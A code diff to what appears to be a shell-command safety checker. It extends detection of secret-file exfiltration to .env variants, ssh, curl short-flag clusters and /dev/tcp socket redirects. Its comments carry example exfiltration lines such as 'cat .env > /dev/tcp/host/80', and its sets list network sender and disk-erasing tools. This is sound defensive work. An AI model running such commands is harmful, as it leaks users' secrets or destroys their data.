@@ -266,7 +266,12 @@ STARTUP_FILES = frozenset(
     {".bashrc", ".bash_profile", ".bash_login", ".profile", ".zshrc", ".zprofile", ".zshenv", ".zlogin", ".gitconfig"}
 )
 STARTUP_DIRS = (".config/fish", "Library/LaunchAgents")
-_DOTENV = re.compile(r"^\.env(\.(?!example$|sample$|template$|dist$|defaults$)[\w.-]+)?$")
+# `.env`, `.env.production`, `.env-prod`, `.envrc`, `prod.env`; not the templates a repository commits.
+_DOTENV = re.compile(
+    r"^(\.env(rc|[.-](?!(example|sample|template|dist|defaults)$)[\w.-]+)?"
+    r"|(?!(example|sample|template|dist|defaults)\.env$)[\w.-]+\.env)$",
+    re.IGNORECASE,
+)
 _ENVIRON = re.compile(r"^/proc/[^/]+/environ$")
 _GLOB_ALL = frozenset({"*", ".*", "**", "{*,.*}"})
 
@@ -785,6 +790,7 @@ def parse_shell(command: str, scope: Scope) -> list[list[Command]]:
 _DOWNLOADERS = frozenset({"curl", "wget", "fetch", "aria2c", "http", "https", "xh"})
 _SENDERS = frozenset(
     {"curl", "wget", "http", "https", "xh", "nc", "ncat", "netcat", "socat", "telnet", "ftp", "sftp", "scp", "rsync"}
+    | {"ssh"}  # its stdin and its command line go to the other host
 )
 _SSH_COPY = frozenset({"scp", "rsync", "sftp"})
 # Commands that put a file's content on their output or in another file.
@@ -799,6 +805,9 @@ _CURL_DATA = frozenset(
     {"-d", "--data", "--data-binary", "--data-urlencode", "--data-ascii", "--json", "-F", "--form", "-T"}
     | {"--upload-file"}
 )
+# curl's `-d`, `-F` or `-T` at the end of a cluster of flags that take no value: `-sT file`, `-sSfd @file`.
+_CURL_SHORT_DATA = re.compile(r"-[sSfLkvIiNgGOJqRZalBpjn#0-6]*([dFT])(.*)", re.S)
+_NETWORK_DEVICE = re.compile(r"^/dev/(tcp|udp)/")  # bash opens a socket for a redirect to `/dev/tcp/host/port`
 _DISK_TOOLS = frozenset({"fdisk", "sfdisk", "gdisk", "sgdisk", "parted", "cfdisk"})
 _DISKUTIL_ERASE = frozenset(
     {"eraseDisk", "eraseVolume", "zeroDisk", "randomDisk", "secureErase", "partitionDisk", "reformat"}
@@ -1065,20 +1074,22 @@ def _sent_files(command: Command) -> list[str]:
     if command.name == "curl":
         for i, arg in enumerate(args):
             value = None
-            if arg in _CURL_DATA:
+            short = None if arg.startswith("--") else _CURL_SHORT_DATA.fullmatch(arg)
+            if arg in _CURL_DATA or (short and not short.group(2)):
                 value = args[i + 1] if i + 1 < len(args) else None
             elif arg.startswith("--") and "=" in arg and arg.split("=", 1)[0] in _CURL_DATA:
                 value = arg.split("=", 1)[1]
-            elif arg[:2] in ("-d", "-F", "-T") and len(arg) > 2:
-                value = arg[2:]
+            elif short:
+                value = short.group(2)
             if value is None:
                 continue
-            if arg.startswith(("-T", "--upload-file")):
+            if arg.startswith("--upload-file") or (short and short.group(1) == "T"):
                 files.append(value)
             elif "@" in value or "<" in value:
                 files.append(re.split(r"[@<]", value, maxsplit=1)[1].split(";")[0])
     elif command.name in ("wget",):
         files += [a.split("=", 1)[1] for a in args if a.startswith(("--post-file=", "--body-file="))]
+        files += [b for a, b in itertools.pairwise(args) if a in ("--post-file", "--body-file")]
     elif command.name in ("http", "https", "xh"):
         files += [re.split(r"@", a, maxsplit=1)[1] for a in args if "=@" in a or a.startswith("@")]
     elif command.name in _SSH_COPY:
@@ -1102,9 +1113,13 @@ def _source_of(command: Command, scope: Scope) -> str | None:
 
 def _secret_send(pipeline: list[Command], scope: Scope) -> RuleHit | None:
     for index, command in enumerate(pipeline):
-        if command.name not in _SENDERS:
+        # `cat .env > /dev/tcp/host/80` and `... | tee /dev/tcp/host/80` send what the command prints.
+        targets = command.writes + (command.positional() if command.name == "tee" else [])
+        socket = any(_NETWORK_DEVICE.match(target) for target in targets)
+        if command.name not in _SENDERS and not socket:
             continue
         found = next((s for f in _sent_files(command) if (s := _send_source(f, scope, command.cwd))), None)
+        found = found or (_source_of(command, scope) if socket else None)
         found = found or next((s for c in pipeline[:index] if (s := _source_of(c, scope))), None)
         found = found or next(
             (s for inner in command.subs.values() for c in inner if (s := _source_of(c, scope))), None
